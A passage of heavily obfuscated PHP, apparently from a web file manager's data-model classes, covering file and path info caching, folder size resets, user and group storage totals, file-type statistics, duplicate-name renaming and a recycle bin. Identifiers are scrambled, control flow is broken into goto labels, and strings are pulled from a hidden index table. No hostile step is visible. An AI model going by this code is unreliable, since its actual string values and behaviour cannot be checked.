$Dœ±Æ‚µ‹È[$DÃ¾‰Ğ”è[28]]); $fÁÀ”Œ˜˜‘ = $this->fileHistory($Dœ±Æ‚µ‹È, $eÇˆ¨ä¶“´[$DÃ¾‰Ğ”è[450]], $eÇˆ¨ä¶“´[$DÃ¾‰Ğ”è[87]]); goto Bõ¶Ö½®®Ô; CŠÁŞŠàÂ: } public function fileSubstr($Dä’î×æ¨, $AÅß…ƒÌ, $aŸ©°„ë•) { $dÛâ¶¹…½ğ = $this->fileInfoGet($Dä’î×æ¨); if (!$dÛâ¶¹…½ğ) { return !1; } return IO::fileSubstr($dÛâ¶¹…½ğ[$_SERVER[í¤âËÚ£¶íÊ¢][85]], $AÅß…ƒÌ, $aŸ©°„ë•); } public function fileInfoGet($d¼ÇÊóç†) { goto Eğ÷ä¨è®; a„‚¬ë à: $fšÓÇôŒ¦ = Model($b­†’†®¯Á[453])->fileInfo($AÅíãÀî‡¬[$b­†’†®¯Á[450]]); if ($fšÓÇôŒ¦) { $fšÓÇôŒ¦[$b­†’†®¯Á[28]] = $AÅíãÀî‡¬[$b­†’†®¯Á[28]]; } self::$cacheFileInfo[$D“Ñ©«è†µ] = $fšÓÇôŒ¦; goto E‹ã¡ß°ƒª; Eğ÷ä¨è®: $b­†’†®¯Á =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÅíãÀî‡¬ = $this->sourceInfo($d¼ÇÊóç†); if (!$AÅíãÀî‡¬ || $AÅíãÀî‡¬[$b­†’†®¯Á[406]]) { return !1; } goto BáŠÍ›İ„´; BáŠÍ›İ„´: $D“Ñ©«è†µ = $b­†’†®¯Á[456] . $AÅíãÀî‡¬[$b­†’†®¯Á[450]]; $Bñ¬Æ¤á‚Ÿ = _get(self::$cacheFileInfo, $D“Ñ©«è†µ); if ($Bñ¬Æ¤á‚Ÿ) { return $Bñ¬Æ¤á‚Ÿ; } goto a„‚¬ë à; E‹ã¡ß°ƒª: return $fšÓÇôŒ¦; goto aÂŞÑ†³”©; aÂŞÑ†³”©: } private function folderChildrenNumber($CÑÖÎ©‹ÈÚ) { $eàíáä‚ã‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fĞ¡‚í±Ÿµ = $this->sourceInfo($CÑÖÎ©‹ÈÚ); $aÆËñ©Ö³’ = array($eàíáä‚ã‡[557] => array($eàíáä‚ã‡[516], $fĞ¡‚í±Ÿµ[$eàíáä‚ã‡[490]] . $CÑÖÎ©‹ÈÚ . $eàíáä‚ã‡[517]), $eàíáä‚ã‡[425] => intval($fĞ¡‚í±Ÿµ[$eàíáä‚ã‡[426]]), $eàíáä‚ã‡[550] => 1); $fÕ£¡ß¶ƒ = $this->where($aÆËñ©Ö³’)->count(); $díºöòÁœÔ = $this->where($aÆËñ©Ö³’)->where(array($eàíáä‚ã‡[550] => 0))->count(); return array($eàíáä‚ã‡[91] => $díºöòÁœÔ, $eàíáä‚ã‡[92] => $fÕ£¡ß¶ƒ); } public function pathInfo($cƒ¾°Ë°É», $B¹à¾ÚŠ‚Ó = false) { goto bÑä¦ŸÁ‰; Bùæ…ó‹á: self::$cachePathInfo[$e½‰¸²«ß”] = $D—Èƒ„ù; return $D—Èƒ„ù; goto D—¶›×Ş‰¸; dÊ•ä…ù³Æ: $D—Èƒ„ù = $this->sourceInfo($cƒ¾°Ë°É»); if (!$D—Èƒ„ù) { return !1; } $D—Èƒ„ù = $this->_listDataApplyItem($D—Èƒ„ù, $B¹à¾ÚŠ‚Ó); goto Bùæ…ó‹á; F Ã³æ“³‹: $e½‰¸²«ß” = $B¤©öÁöÙ›[442] . intval($B¹à¾ÚŠ‚Ó) . $B¤©öÁöÙ›[443] . $cƒ¾°Ë°É»; $cÜĞõ‹¹î™ = _get(self::$cachePathInfo, $e½‰¸²«ß”); if ($cÜĞõ‹¹î™) { return $cÜĞõ‹¹î™; } goto dÊ•ä…ù³Æ; bÑä¦ŸÁ‰: $B¤©öÁöÙ› =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B¹à¾ÚŠ‚Ó = !1; $cƒ¾°Ë°É» = intval($cƒ¾°Ë°É»); goto F Ã³æ“³‹; D—¶›×Ş‰¸: } public static $cachePathInfoMore = array(); public function pathInfoMore($eùÛ‰ßÄ²§) { goto fµ„ ÒËÆŒ; bÌ˜ñË‚«: self::$cachePathInfoMore[$eùÛ‰ßÄ²§] = $b‹•Ä‚†à; return $b‹•Ä‚†à; goto eâ­¢ëé; fµ„ ÒËÆŒ: $Bà¢öÖÀˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a÷¤‚®‡–ç = _get(self::$cachePathInfoMore, $eùÛ‰ßÄ²§); if ($a÷¤‚®‡–ç) { return $a÷¤‚®‡–ç; } goto DÜÓåÑ÷“ó; DÜÓåÑ÷“ó: $b‹•Ä‚†à = $this->pathInfo($eùÛ‰ßÄ²§); if (!$b‹•Ä‚†à) { return !1; } if ($b‹•Ä‚†à[$Bà¢öÖÀˆ[406]] == $Bà¢öÖÀˆ[96]) { $b‹•Ä‚†à[$Bà¢öÖÀˆ[90]] = $this->folderChildrenNumber($eùÛ‰ßÄ²§); } goto bÌ˜ñË‚«; eâ­¢ëé: } public function sourceInfo($FÇÅ”®¾çË) { goto D´ùğ¦¿‡; f†ª¢ƒÚÃŞ: $F·Ê¡èÍ½Ù = $FĞË•èÅ­´[441] . $FÇÅ”®¾çË; $Fã­Å¹›Ú = _get(self::$cacheSourceInfo, $F·Ê¡èÍ½Ù); if ($Fã­Å¹›Ú) { return $Fã­Å¹›Ú; } goto bÀ¹‹ˆ™¥; bÀ¹‹ˆ™¥: $Dªå¨Š“ğĞ = $this->where(array($FĞË•èÅ­´[399] => $FÇÅ”®¾çË))->find(); self::$cacheSourceInfo[$F·Ê¡èÍ½Ù] = $Dªå¨Š“ğĞ; return self::$cacheSourceInfo[$F·Ê¡èÍ½Ù]; goto fÆòÆÁ‚½; D´ùğ¦¿‡: $FĞË•èÅ­´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$FÇÅ”®¾çË) { return array(); } $FÇÅ”®¾çË = intval($FÇÅ”®¾çË); goto f†ª¢ƒÚÃŞ; fÆòÆÁ‚½: } public function sourceCacheClear($e…ˆŒæÁ‚• = false) { self::cacheClear($e…ˆŒæÁ‚•); } public static function cacheClear($fçÑßğ¸’ç = false) { $d“‚¢ÑÌÌ¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($fçÑßğ¸’ç == !1) { goto DÏÖ›Êšéœ; e½ªÈ£·Î–: return; goto f™Æ®ÇÇ§˜; f¯åšÃĞ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto e½ªÈ£·Î–; DÏÖ›Êšéœ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto f¯åšÃĞ; f™Æ®ÇÇ§˜: } unset(self::$cacheSourceInfo[$d“‚¢ÑÌÌ¦[441] . $fçÑßğ¸’ç]); unset(self::$cachePathInfoMore[$fçÑßğ¸’ç]); unset(self::$cachePathInfo[$d“‚¢ÑÌÌ¦[1936] . $fçÑßğ¸’ç]); unset(self::$cachePathInfo[$d“‚¢ÑÌÌ¦[1937] . $fçÑßğ¸’ç]); } public function metaSet($a¢ÅÙíØÉ«, $D ¬½ğêÁÍ = null, $eÁÙ­Âô® = null) { $cƒäÓ½†…è = parent::metaSet($a¢ÅÙíØÉ«, $D ¬½ğêÁÍ, $eÁÙ­Âô®); if ($cƒäÓ½†…è) { $this->sourceCacheClear($a¢ÅÙíØÉ«); } return $cƒäÓ½†…è; } public function pathInfoByPath($AÅÀï™ÍÁ§, $fçŞä„»Ãä) { $c½¨ÙŸÄÕ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÛ‹Ë†ŠÅ‘ = !$fçŞä„»Ãä ? array() : explode($c½¨ÙŸÄÕ[8], trim($fçŞä„»Ãä, $c½¨ÙŸÄÕ[8])); $cÎËÏ”‹¥‚ = $AÅÀï™ÍÁ§; foreach ($fÛ‹Ë†ŠÅ‘ as $C¹ÍÏî¾ˆ°) { $bñÎµïŸƒÔ = array($c½¨ÙŸÄÕ[481] => $cÎËÏ”‹¥‚, $c½¨ÙŸÄÕ[28] => $C¹ÍÏî¾ˆ°); $Câöˆ ëÒÄ = $this->where($bñÎµïŸƒÔ)->select(); if (!$Câöˆ ëÒÄ) { return !1; } $Câöˆ ëÒÄ = array_sort_by($Câöˆ ëÒÄ, $c½¨ÙŸÄÕ[426]); $cÎËÏ”‹¥‚ = $Câöˆ ëÒÄ[0][$c½¨ÙŸÄÕ[399]]; } return $this->pathInfo($cÎËÏ”‹¥‚, !0); } protected function updateModifyTime($b¬ê‰ŞÀ¢ù) { goto b¸“„–Ü£ˆ; b¸“„–Ü£ˆ: $cÎß…½ó‘™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$b¬ê‰ŞÀ¢ù) { return; } if (!is_array($b¬ê‰ŞÀ¢ù)) { $b¬ê‰ŞÀ¢ù = array($b¬ê‰ŞÀ¢ù); } goto bï¼Í¥ºò; eÉëé’ÚŸ: $this->where($a„œ¶ĞëÑ·)->save($dØÛ¨æ¤õ); goto D´Ÿ¢³§ø’; bï¼Í¥ºò: foreach ($b¬ê‰ŞÀ¢ù as $dŠ¦ŠÈ‚ => $eÜ•ó¦Š¿) { $b¬ê‰ŞÀ¢ù[$dŠ¦ŠÈ‚] = intval($eÜ•ó¦Š¿); $this->sourceCacheClear($eÜ•ó¦Š¿); } $a„œ¶ĞëÑ· = array($cÎß…½ó‘™[399] => array($cÎß…½ó‘™[7], $b¬ê‰ŞÀ¢ù)); $dØÛ¨æ¤õ = array($cÎß…½ó‘™[556] => USER_ID, $cÎß…½ó‘™[420] => time()); goto eÉëé’ÚŸ; D´Ÿ¢³§ø’: } public function folderSizeReset($FğÙæá®Ú, $c«ŞŠÖÄ²é = false) { goto eªÄŠÆ¤ğó; C•É­Ü–: $Eä¥ÉŒº° = array($a¿Õäæáé[$fÄ¿ßÉ¡ç[407]], $a¿Õäæáé[$fÄ¿ßÉ¡ç[487]]); TaskRun::timeLimitCall($CÌ“ÛÍ«¶, $fÄ¿ßÉ¡ç[1940], $Eä¥ÉŒº°, 1.5); goto cæáÄªâÓ…; AŸŠ·ñçÛ: $this->where($DÁ™Õ“áÌ‡)->setAdd($fÄ¿ßÉ¡ç[87], $c«ŞŠÖÄ²é); CacheLock::unlock($fè¶¯†Á²£); $CÌ“ÛÍ«¶ = $fÄ¿ßÉ¡ç[1939] . $a¿Õäæáé[$fÄ¿ßÉ¡ç[407]] . $fÄ¿ßÉ¡ç[4] . $a¿Õäæáé[$fÄ¿ßÉ¡ç[487]]; goto C•É­Ü–; e°Ï³»İ±: $fè¶¯†Á²£ = $fÄ¿ßÉ¡ç[1938] . $FğÙæá®Ú; CacheLock::lock($fè¶¯†Á²£, 20); if ($c«ŞŠÖÄ²é === !1) { $this->sourceCacheClear($FğÙæá®Ú); $a¿Õäæáé = $this->sourceInfo($FğÙæá®Ú); $DÁ™Õ“áÌ‡ = array($fÄ¿ßÉ¡ç[398] => $FğÙæá®Ú, $fÄ¿ßÉ¡ç[425] => 0); $eˆˆ—¤ø¯‚ = $this->where($DÁ™Õ“áÌ‡)->sum($fÄ¿ßÉ¡ç[87]); $c«ŞŠÖÄ²é = intval($eˆˆ—¤ø¯‚) - intval($a¿Õäæáé[$fÄ¿ßÉ¡ç[87]]); } goto fÁñ»Æ••; A÷ì‡Ğæ¦: $F’Ç•ùµÍÃ[] = $a¿Õäæáé[$fÄ¿ßÉ¡ç[399]]; $DÁ™Õ“áÌ‡ = array($fÄ¿ßÉ¡ç[399] => array($fÄ¿ßÉ¡ç[414], $F’Ç•ùµÍÃ)); if ($c«ŞŠÖÄ²é < 0) { $DÁ™Õ“áÌ‡[$fÄ¿ßÉ¡ç[87]] = array($fÄ¿ßÉ¡ç[933], abs($c«ŞŠÖÄ²é)); } goto AŸŠ·ñçÛ; eªÄŠÆ¤ğó: $fÄ¿ßÉ¡ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->statusIgnoreResetSpace) { return; } $a¿Õäæáé = $this->sourceInfo($FğÙæá®Ú); goto e°Ï³»İ±; fÁñ»Æ••: if ($c«ŞŠÖÄ²é == 0) { return CacheLock::unlock($fè¶¯†Á²£); } $F’Ç•ùµÍÃ = $this->parentLevelArray($a¿Õäæáé[$fÄ¿ßÉ¡ç[490]]); if (!$F’Ç•ùµÍÃ) { $F’Ç•ùµÍÃ = array(); } goto A÷ì‡Ğæ¦; cæáÄªâÓ…: } public function folderSizeResetChildren($f’ñàµ‘Ñ) { goto eÁ ¬šÑøó; eÁ ¬šÑøó: $d±à³Òöë‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->sourceCacheClear($f’ñàµ‘Ñ); $aïŠ®«‹§‰ = $this->sourceInfo($f’ñàµ‘Ñ); goto c½Ù²¬æä§; A½¯ò„áµ: $aÆ¯—»‹[] = $aïŠ®«‹§‰; $aÆ¯—»‹ = array_to_keyvalue($aÆ¯—»‹, $d±à³Òöë‰[399]); foreach ($aÆ¯—»‹ as $c±½·çĞ‡ => $BŠƒÒŠ÷Ê) { $aÆ¯—»‹[$c±½·çĞ‡][$d±à³Òöë‰[1942]] = $aÆ¯—»‹[$c±½·çĞ‡][$d±à³Òöë‰[87]]; $aÆ¯—»‹[$c±½·çĞ‡][$d±à³Òöë‰[87]] = 0; } goto Bù÷ß–ËÉá; D‰ƒ‰”™í¥: foreach ($aÆ¯—»‹ as $BŠƒÒŠ÷Ê) { if ($BŠƒÒŠ÷Ê[$d±à³Òöë‰[87]] == $BŠƒÒŠ÷Ê[$d±à³Òöë‰[1942]]) { continue; } $DÈ‚Ş¢Ë˜ˆ[] = array($d±à³Òöë‰[399], $BŠƒÒŠ÷Ê[$d±à³Òöë‰[399]], $d±à³Òöë‰[87], $BŠƒÒŠ÷Ê[$d±à³Òöë‰[87]]); } $this->saveAll($DÈ‚Ş¢Ë˜ˆ); goto BÒ†Û£‹ÛÊ; c½Ù²¬æä§: $B¦ˆ¨ñß‘ = array($d±à³Òöë‰[550] => 1, $d±à³Òöë‰[557] => array($d±à³Òöë‰[516], $aïŠ®«‹§‰[$d±à³Òöë‰[490]] . $f’ñàµ‘Ñ . $d±à³Òöë‰[517])); $eÈÈ¥Å™¯ = $d±à³Òöë‰[1941]; $aÆ¯—»‹ = $this->field($eÈÈ¥Å™¯)->where($B¦ˆ¨ñß‘)->select(); goto b¯œÏøßÌ; Bù÷ß–ËÉá: foreach ($F”Ÿ˜¥´° as $BŠƒÒŠ÷Ê) { $d“’Ë¸‘§ = $BŠƒÒŠ÷Ê[$d±à³Òöë‰[481]] . $d±à³Òöë‰[33]; if (!isset($aÆ¯—»‹[$d“’Ë¸‘§])) { continue; } if ($BŠƒÒŠ÷Ê[$d±à³Òöë‰[426]] == $aÆ¯—»‹[$d“’Ë¸‘§][$d±à³Òöë‰[426]]) { $aÆ¯—»‹[$d“’Ë¸‘§][$d±à³Òöë‰[87]] += $BŠƒÒŠ÷Ê[$d±à³Òöë‰[87]]; } } foreach ($aÆ¯—»‹ as $BŠƒÒŠ÷Ê) { $AºÆ™ªÁŠÀ = $this->parentLevelArray($BŠƒÒŠ÷Ê[$d±à³Òöë‰[490]]); foreach ($AºÆ™ªÁŠÀ as $d“’Ë¸‘§) { $d“’Ë¸‘§ = $d“’Ë¸‘§ . $d±à³Òöë‰[33]; if (!isset($aÆ¯—»‹[$d“’Ë¸‘§])) { continue; } if ($BŠƒÒŠ÷Ê[$d±à³Òöë‰[426]] == $aÆ¯—»‹[$d“’Ë¸‘§][$d±à³Òöë‰[426]]) { $aÆ¯—»‹[$d“’Ë¸‘§][$d±à³Òöë‰[87]] += $BŠƒÒŠ÷Ê[$d±à³Òöë‰[87]]; } } } $DÈ‚Ş¢Ë˜ˆ = array(); goto D‰ƒ‰”™í¥; b¯œÏøßÌ: $B¦ˆ¨ñß‘[$d±à³Òöë‰[406]] = 0; $F”Ÿ˜¥´° = $this->field($eÈÈ¥Å™¯)->where($B¦ˆ¨ñß‘)->select(); if (!$F”Ÿ˜¥´°) { return; } goto A½¯ò„áµ; BÒ†Û£‹ÛÊ: } public function userSpaceReset($C¡©ß™Š¥Ö = false) { $Dé‰ƒ£ÆùÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A“ÒÙÏ®èÄ = $this->where(array($Dé‰ƒ£ÆùÁ[407] => self::TYPE_USER, $Dé‰ƒ£ÆùÁ[487] => $C¡©ß™Š¥Ö, $Dé‰ƒ£ÆùÁ[406] => 0))->sum($Dé‰ƒ£ÆùÁ[87]); $A“ÒÙÏ®èÄ = !$A“ÒÙÏ®èÄ || $A“ÒÙÏ®èÄ <= 0 ? 0 : $A“ÒÙÏ®èÄ; Model($Dé‰ƒ£ÆùÁ[506])->userEdit($C¡©ß™Š¥Ö, array($Dé‰ƒ£ÆùÁ[1636] => $A“ÒÙÏ®èÄ)); } public function targetSpaceUpdate($BÎãšêÖ—¢, $dŠ¶Ìó›ÓÁ) { $B’Íåµå¿½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dŠ¶Ìó›ÓÁ) { return; } if (!in_array($BÎãšêÖ—¢, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f¬«ğ™º® = $this->targetSpaceSize($BÎãšêÖ—¢, $dŠ¶Ìó›ÓÁ); if ($BÎãšêÖ—¢ == self::TYPE_USER) { Model($B’Íåµå¿½[506])->userEdit($dŠ¶Ìó›ÓÁ, array($B’Íåµå¿½[1636] => $f¬«ğ™º®)); } else { if ($BÎãšêÖ—¢ == self::TYPE_GROUP) { Model($B’Íåµå¿½[489])->groupEdit($dŠ¶Ìó›ÓÁ, array($B’Íåµå¿½[1636] => $f¬«ğ™º®)); } } } public function targetSpaceSize($DÅœŞÖ–ø, $fÅ…É¥ˆãº) { goto C¼Û¹Ï¯í; BÓÈìÂ¥Ã: $F«™Ëœ¬èç = array_to_keyvalue($F«™Ëœ¬èç, $A×æÕÄÍª¬[33], $A×æÕÄÍª¬[399]); $F«™Ëœ¬èç = array_unique(array_filter($F«™Ëœ¬èç)); if ($F«™Ëœ¬èç) { $E°Çˆöñ¹¦ = array($A×æÕÄÍª¬[413] => array($A×æÕÄÍª¬[414], $F«™Ëœ¬èç)); $c³‹±ô°³ += floatval($this->where($E°Çˆöñ¹¦)->sum($A×æÕÄÍª¬[87])); } goto bğŸ‚ã›„’; f¢¡ïš¼¨: $c³‹±ô°³ = floatval($aÈÉŒ² Î½[$A×æÕÄÍª¬[87]]); $E°Çˆöñ¹¦ = array($A×æÕÄÍª¬[557] => array($A×æÕÄÍª¬[516], $A×æÕÄÍª¬[502] . $aÈÉŒ² Î½[$A×æÕÄÍª¬[399]] . $A×æÕÄÍª¬[517])); $F«™Ëœ¬èç = Model($A×æÕÄÍª¬[424])->field($A×æÕÄÍª¬[413])->where($E°Çˆöñ¹¦)->select(); goto BÓÈìÂ¥Ã; C¼Û¹Ï¯í: $A×æÕÄÍª¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÈÉŒ² Î½ = $this->sourceRoot($DÅœŞÖ–ø, $fÅ…É¥ˆãº, !0); if (!$aÈÉŒ² Î½) { return 0; } goto f¢¡ïš¼¨; bğŸ‚ã›„’: $c³‹±ô°³ = !$c³‹±ô°³ || $c³‹±ô°³ <= 0 ? 0 : $c³‹±ô°³; return $c³‹±ô°³; goto dËƒ¶šÇ˜; dËƒ¶šÇ˜: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($EÏ…Ü‹’Ú) { return $this->fileTypeProfile($EÏ…Ü‹’Ú, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C²£®Ü¢›„) { return $this->fileTypeProfile($C²£®Ü¢›„, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C«Ûå³¼§ò, $c§¬‘÷…º„) { goto aÍáöİË‹«; c»…ğƒÜäå: $Aê¨êœÔ­ = array(); $Aê¨êœÔ­[$D¼––‹¯¹œ[1944]] = array($D¼––‹¯¹œ[1945] => LNG($D¼––‹¯¹œ[1944]), $D¼––‹¯¹œ[1946] => $this->where($DÍùÁ¬½ğ)->count(), $D¼––‹¯¹œ[552] => $this->where($DÍùÁ¬½ğ)->sum($D¼––‹¯¹œ[87])); $A‚×¤¸…ë = KodIO::fileTypeList(); goto c¡Úë¾¼£¾; aÍáöİË‹«: $D¼––‹¯¹œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bªëã§ÁºÕ = $D¼––‹¯¹œ[1943] . $C«Ûå³¼§ò . $D¼––‹¯¹œ[80] . $c§¬‘÷…º„; $E‘áŸµÌ‚ = Cache::get($bªëã§ÁºÕ); goto BÄààÑİ”´; c¡Úë¾¼£¾: foreach ($A‚×¤¸…ë as $C¾«ë»ØÔ¼ => $Eå±éÕÁèœ) { $DÍùÁ¬½ğ[$D¼––‹¯¹œ[408]] = $this->fileTypeWhere($C¾«ë»ØÔ¼); $Aê¨êœÔ­[$C¾«ë»ØÔ¼] = array($D¼––‹¯¹œ[1945] => $Eå±éÕÁèœ[$D¼––‹¯¹œ[28]], $D¼––‹¯¹œ[1946] => $this->where($DÍùÁ¬½ğ)->count(), $D¼––‹¯¹œ[552] => $this->where($DÍùÁ¬½ğ)->sum($D¼––‹¯¹œ[87])); } Cache::set($bªëã§ÁºÕ, $Aê¨êœÔ­, 1200); return $Aê¨êœÔ­; goto D¨“Û•®¬„; BÄààÑİ”´: if ($E‘áŸµÌ‚) { return $E‘áŸµÌ‚; } $DÍùÁ¬½ğ = array($D¼––‹¯¹œ[550] => 0); if ($C«Ûå³¼§ò != !1) { $DÍùÁ¬½ğ[$D¼––‹¯¹œ[487]] = $C«Ûå³¼§ò; $DÍùÁ¬½ğ[$D¼––‹¯¹œ[407]] = $c§¬‘÷…º„; } goto c»…ğƒÜäå; D¨“Û•®¬„: } public function fileNameExist($Bê¥÷±Åª”, $DŒâµœ¸ÕÑ) { $B»ä¤›¸›ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B´©š±â²ë = $this->childList($Bê¥÷±Åª”); foreach ($B´©š±â²ë as $eëŠå—õÊ) { if ($eëŠå—õÊ[$B»ä¤›¸›ù[28]] == $DŒâµœ¸ÕÑ) { return $eëŠå—õÊ[$B»ä¤›¸›ù[399]]; } if (strtolower($eëŠå—õÊ[$B»ä¤›¸›ù[28]]) == strtolower($DŒâµœ¸ÕÑ)) { return $eëŠå—õÊ[$B»ä¤›¸›ù[399]]; } } return !1; } public function childList($fÉ´™¬–‚‚) { goto cõŠ¾ëÊÚ; cõŠ¾ëÊÚ: $E²ã’æì·É =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Böñ÷œô™± = $E²ã’æì·É[1921] . $fÉ´™¬–‚‚; if (isset(self::$cacheChildList[$Böñ÷œô™±])) { return self::$cacheChildList[$Böñ÷œô™±]; } goto CèÜ»˜º¦; f¯²Ñ‘¹øÌ: self::$cacheChildList[$Böñ÷œô™±] = $e‹ÏæÇ¦; foreach ($e‹ÏæÇ¦ as $BÃøÙï²°½) { $Böñ÷œô™± = $E²ã’æì·É[441] . $BÃøÙï²°½[$E²ã’æì·É[399]]; self::$cacheSourceInfo[$Böñ÷œô™±] = $BÃøÙï²°½; } return $e‹ÏæÇ¦; goto F±“ĞÄÊ‡â; CèÜ»˜º¦: $bØ¬£˜ì = array($E²ã’æì·É[481] => intval($fÉ´™¬–‚‚), $E²ã’æì·É[426] => 0); $e‹ÏæÇ¦ = $this->where($bØ¬£˜ì)->select(); $e‹ÏæÇ¦ = $e‹ÏæÇ¦ ? $e‹ÏæÇ¦ : array(); goto f¯²Ñ‘¹øÌ; F±“ĞÄÊ‡â: } public function fileNameAuto($E¹ÙÁİÊó, $e•‹İ‡§éÃ, $B©ÇŒ™ÛÒ = REPEAT_RENAME, $eëëß’ƒ‰Ú = false) { $F‰Œæ™‚– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÓ³¬Ñ¡šó = $this->childList($E¹ÙÁİÊó); $fÍ¼”¾Ø†ñ = array_to_keyvalue($bÓ³¬Ñ¡šó, $F‰Œæ™‚–[33], $F‰Œæ™‚–[28]); return $this->fileNameAutoGet($fÍ¼”¾Ø†ñ, $e•‹İ‡§éÃ, $B©ÇŒ™ÛÒ, $eëëß’ƒ‰Ú); } public function fileNameAutoGet($C©ÅÔğŸù, $f¿äÆòØã—, $EïÁÙ† Öâ, $CŠ¬«Ü¡‘Š) { $bÔÎ‹Ìš¨î =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($EïÁÙ† Öâ == REPEAT_REPLACE || !$C©ÅÔğŸù || !in_array_not_case($f¿äÆòØã—, $C©ÅÔğŸù) || $CŠ¬«Ü¡‘Š && $EïÁÙ† Öâ != REPEAT_RENAME_FOLDER) { return $f¿äÆòØã—; } if ($EïÁÙ† Öâ == REPEAT_SKIP) { return !1; } $f‡ç¥‰†ó¸ = $bÔÎ‹Ìš¨î[104] . get_path_ext($f¿äÆòØã—); $f‡ç¥‰†ó¸ = $f‡ç¥‰†ó¸ == $bÔÎ‹Ìš¨î[104] || $CŠ¬«Ü¡‘Š ? $bÔÎ‹Ìš¨î[33] : $f‡ç¥‰†ó¸; for ($C±´³ƒ– = 1; $C±´³ƒ– <= count($C©ÅÔğŸù) + 1; $C±´³ƒ–++) { $Eæ™Ğ…ÈÃ¨ = substr($f¿äÆòØã—, 0, strlen($f¿äÆòØã—) - strlen($f‡ç¥‰†ó¸)); $dµ äßˆ«¹ = $Eæ™Ğ…ÈÃ¨ . "\x28{$C±´³ƒ–}\51{$f‡ç¥‰†ó¸}"; if (!in_array_not_case($dµ äßˆ«¹, $C©ÅÔğŸù)) { return $dµ äßˆ«¹; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\145\x5f\162\x65\x63\x79\143\154\145"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\x69\155\145", "\164\151\x6d\145", "\151\x6e\x73\145\x72\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); public function listData($CÇ½òØéøÁ = false) { $bŞÕ¹Ì¿Û =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÇ½òØéøÁ = $CÇ½òØéøÁ ? $CÇ½òØéøÁ : USER_ID; $dË¡§Ó‡Ñ¤ = $this->where(array($bŞÕ¹Ì¿Û[1479] => $CÇ½òØéøÁ))->select(); return array_to_keyvalue($dË¡§Ó‡Ñ¤, $bŞÕ¹Ì¿Û[33], $bŞÕ¹Ì¿Û[399]); } public function moveToRecycle($aÑßÏÔÉ«) { goto C›À¥Ó¨›À; C›À¥Ó¨›À: $EË½ªõĞëÒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Bïö‘¤‹ä¿ = Model($EË½ªõĞëÒ[1164]); $DÙ¬è¡ó® = $Bïö‘¤‹ä¿->sourceInfo($aÑßÏÔÉ«); goto BÛ“êšâ³Ú; D¯¾Â‰Àº: $this->recycleMove($aÑßÏÔÉ«, 1); if ($DÙ¬è¡ó®[$EË½ªõĞëÒ[406]] == $EË½ªõĞëÒ[96]) { $AÎç˜„ÂÓÈ = array($EË½ªõĞëÒ[557] => array($EË½ªõĞëÒ[516], $DÙ¬è¡ó®[$EË½ªõĞëÒ[490]] . $aÑßÏÔÉ« . $EË½ªõĞëÒ[517])); $Bïö‘¤‹ä¿->where($AÎç˜„ÂÓÈ)->setField($EË½ªõĞëÒ[426], 1); } goto aòÜÕ…õ´õ; BÛ“êšâ³Ú: if (!$DÙ¬è¡ó® || $DÙ¬è¡ó®[$EË½ªõĞëÒ[426]] == $EË½ªõĞëÒ[96]) { return; } $A¢Ã‚‡È‚ = array($EË½ªõĞëÒ[413] => $aÑßÏÔÉ«, $EË½ªõĞëÒ[1479] => USER_ID, $EË½ªõĞëÒ[553] => $DÙ¬è¡ó®[$EË½ªõĞëÒ[407]], $EË½ªõĞëÒ[554] => $DÙ¬è¡ó®[$EË½ªõĞëÒ[487]], $EË½ªõĞëÒ[557] => $DÙ¬è¡ó®[$EË½ªõĞëÒ[490]]); $this->add($A¢Ã‚‡È‚); goto D¯¾Â‰Àº; aòÜÕ…õ´õ: } public function clear() { $this->remove(!1); } public function remove($fë˜À©öñ = false) { goto e×±‹™; dÎ†÷¡Áˆ§: foreach ($f‰Å‚‰­Ğ® as $E¥¢²” Ò) { $f«±ÍÌ–´ƒ->targetSpaceUpdate($E¥¢²” Ò[$Fˆ—ÛîšÈ[407]], $E¥¢²” Ò[$Fˆ—ÛîšÈ[487]]); } goto cÌ‘ÃËÒãÅ; e×±‹™: $Fˆ—ÛîšÈ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f«±ÍÌ–´ƒ = Model($Fˆ—ÛîšÈ[1164]); $f¢½„š¦«ª = $this->listData(); goto b˜¿½•½¾ ; b˜¿½•½¾ : $fë˜À©öñ = $fë˜À©öñ === !1 ? !1 : $fë˜À©öñ; $f‰Å‚‰­Ğ® = array(); foreach ($f¢½„š¦«ª as $B®Ñ‰Ï¤¿) { if ($fë˜À©öñ != !1 && !in_array($B®Ñ‰Ï¤¿, $fë˜À©öñ)) { continue; } $F†»“­¯ğ = $f«±ÍÌ–´ƒ->sourceInfo($B®Ñ‰Ï¤¿); $f«±ÍÌ–´ƒ->remove($B®Ñ‰Ï¤¿, !1); $b„½×µëÇ½ = $F†»“­¯ğ[$Fˆ—ÛîšÈ[407]] . $Fˆ—ÛîšÈ[80] . $F†»“­¯ğ[$Fˆ—ÛîšÈ[487]]; $f‰Å‚‰­Ğ®[$b„½×µëÇ½] = 